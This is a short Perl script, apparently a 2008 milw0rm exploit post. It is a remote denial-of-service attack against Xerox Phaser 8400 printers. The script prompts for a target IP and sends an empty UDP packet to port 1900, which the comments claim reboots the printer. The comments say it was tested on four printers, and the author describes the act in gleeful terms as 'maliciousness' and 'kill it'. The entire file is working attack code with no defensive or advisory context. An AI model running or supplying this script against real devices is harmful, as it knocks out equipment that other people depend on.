#!/usr/bin/perl
# carved-out by: crit3rion, just making th3 world a b3tt3r plac3!
# Xerox_Remote_DoS.20080801.ver01 (tanx to dr0pz0N3 for reminding me to close my #$*&*! s0ck3t)
# Make: Xerox
# Model: Phaser 8400
# Firmware: 03/03/2004
#
# What's the deal?
# Apparently, if you send an empty packet to a Xerox Phaser 8400 printer
# the printer will reboot.  Tested successfully on four printers.
# 

# Let's not leave our maliciousness open to exploitation and errors!
use strict;
use warnings;
use IO::Socket::INET;

# What's your printer's IP Address?
print "Please enter the printers IP:\n";
my $ipaddr = <STDIN>;
chomp $ipaddr;

# Let's setup the connection...
my $socket = IO::Socket::INET->new(
 PeerPort => 1900,
 PeerAddr => $ipaddr,
 Proto => "udp" )
 or die "I tried. Maybe you entered the wrong IP?\n Maybe it's just my bad code...\n In any case, check: $@\n\n";

# Okay... Let's kill it.
$socket->send("");
$socket->close();

print "Done. It should have died.\n\n";
exit(1);

# milw0rm.com [2008-08-03]
